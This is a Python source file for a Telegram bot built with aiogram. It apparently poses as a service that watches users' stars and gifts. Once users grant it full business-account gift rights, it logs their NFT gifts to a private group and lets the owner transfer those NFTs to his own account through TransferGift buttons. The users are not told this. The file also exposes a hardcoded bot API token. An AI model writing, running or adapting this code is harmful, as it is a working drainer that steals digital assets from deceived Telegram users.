import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.methods import GetBusinessConnection, GetBusinessAccountGifts, TransferGift
from aiogram.types.business_bot_rights import BusinessBotRights

API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
LOG_GROUP_ID = -1002710995756
OWNER_ID = 7072373613

bot = Bot(token=API_TOKEN, parse_mode="HTML")
dp = Dispatcher()

authorized = {}  # user_id → {"connection_id": str, "username": str, "gifts": list, "stars": int, "notified": bool}

# 🎯 Trigger when a user adds your bot via Telegram Business Chatbots
@dp.business_connection()
async def on_business_connect(con: F):
    user = con.user
    rights: BusinessBotRights = con.rights

    if not (rights and rights.can_view_gifts_and_stars and rights.can_transfer_and_upgrade_gifts):
        await bot.send_message(user.id, "❌ Please grant full 'Gifts and Stars' permissions to use this bot.")
        return

    conn_id = con.id

    resp = await bot(GetBusinessAccountGifts(business_connection_id=conn_id))
    gifts = resp.gifts or []
    gift_ids = [g.owned_gift_id for g in gifts]
    gift_titles = [g.unique_gift.title if hasattr(g, "unique_gift") else g.title for g in gifts]

    authorized[user.id] = {
        "connection_id": conn_id,
        "username": f"@{user.username}" if user.username else user.first_name,
        "gifts": list(zip(gift_ids, gift_titles)),
        "stars": 0,
        "notified": False
    }

    gift_list = "\n".join(f"- {title}" for _, title in authorized[user.id]["gifts"]) or "(no NFTs)"

    await bot.send_message(LOG_GROUP_ID,
        f"✅ <a href='tg://user?id={user.id}'>{user.first_name}</a> granted full gift rights.\n🎁 NFTs they own:\n{gift_list}"
    )
    await bot.send_message(user.id, "🎉 Connected! We’ll watch your stars and gifts.")

# 🧪 Simulate / your star tracking logic here or integrate payment updates
@dp.message(F.text.startswith("/addstars") & F.from_user.id == OWNER_ID)
async def addstars(message: Message):
    _, uid, amt = message.text.split()
    uid, amt = int(uid), int(amt)
    if uid not in authorized:
        return await message.reply("User not registered.")
    authorized[uid]["stars"] += amt
    await message.reply(f"Added {amt} stars to {authorized[uid]['username']}")
    await notify_ready(uid)

async def notify_ready(user_id: int):
    data = authorized[user_id]
    if data["stars"] >= 30 and not data["notified"]:
        buttons = [
            InlineKeyboardButton(f"Send {title}", callback_data=f"xfer:{user_id}:{gift_id}")
            for gift_id, title in data["gifts"]
        ]
        markup = InlineKeyboardMarkup(inline_keyboard=[[b] for b in buttons])
        await bot.send_message(OWNER_ID, f"🎉 {data['username']} has ≥30 stars. Select an NFT to transfer:", reply_markup=markup)
        data["notified"] = True

@dp.callback_query(F.data.startswith("xfer:"))
async def on_transfer(cb: CallbackQuery):
    _, uid_str, gift_id = cb.data.split(":")
    uid = int(uid_str); data = authorized.get(uid)
    if cb.from_user.id != OWNER_ID or not data:
        return await cb.answer("❌ Not allowed.", show_alert=True)

    success = await bot(TransferGift(
        business_connection_id=data["connection_id"],
        owned_gift_id=gift_id,
        new_owner_chat_id=OWNER_ID,
        star_count=25  # cost to transfer
    ))
    if success:
        await cb.message.edit_text(f"✅ Transferred NFT to Owner.")
        await bot.send_message(LOG_GROUP_ID, f"🎁 NFT {gift_id} moved from {data['username']} to Owner.")
    else:
        await cb.answer("❌ Transfer failed.", show_alert=True)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(dp, host="0.0.0.0", port=8000)
